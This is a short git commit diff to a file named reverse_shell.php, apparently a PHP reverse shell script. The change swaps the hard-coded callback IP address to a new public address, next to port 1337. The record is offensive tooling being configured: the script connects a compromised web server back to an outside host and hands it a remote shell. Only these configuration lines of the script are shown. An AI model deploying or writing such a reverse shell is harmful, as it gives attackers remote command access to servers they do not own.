f1e304a05a8d7a47f575cce4d6b2a262d425c0c5
Abhishek (Hexkid) <25879313+hex406@users.noreply.github.com>
2026-05-22 13:26:32 +0530

    Update reverse_shell.php

--- reverse_shell.php
+++ reverse_shell.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '13.202.147.72';  // CHANGE THIS
+$ip = '15.206.254.6';  // CHANGE THIS
 $port = 1337;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
